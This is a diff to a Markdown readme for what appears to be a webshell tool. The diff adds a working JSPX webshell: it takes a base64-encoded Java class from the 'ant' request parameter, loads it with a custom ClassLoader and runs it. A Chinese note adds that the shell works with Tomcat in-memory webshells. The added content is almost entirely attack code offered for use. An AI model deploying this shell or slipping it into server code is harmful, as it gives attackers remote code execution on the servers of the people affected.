@@ -34,6 +34,7 @@ Linux/Mac os
 ```
 
 ## Shell
+shell.jsp
 
 ```
 <%!
@@ -65,6 +66,37 @@ Linux/Mac os
 %>
 ```
 
+shell.jspx
+```
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
+    <jsp:declaration>
+        class U extends ClassLoader {
+            U(ClassLoader c) {
+                super(c);
+            }
+            public Class g(byte[] b) {
+                return super.defineClass(b, 0, b.length);
+            }
+        }
+        public byte[] base64Decode(String str) throws Exception {
+            try {
+                Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+            } catch (Exception e) {
+                Class clazz = Class.forName("java.util.Base64");
+                Object decoder = clazz.getMethod("getDecoder").invoke(null);
+                return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            }
+        }
+    </jsp:declaration>
+    <jsp:scriptlet>
+        String cls = request.getParameter("ant");
+        if (cls != null) {
+            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+        }
+    </jsp:scriptlet>
+</jsp:root>
+```
 其中`pageContext`可以替换为`request`或者`response`，以实现对Tomcat内存Webshell的兼容
 
 ## 更新日志
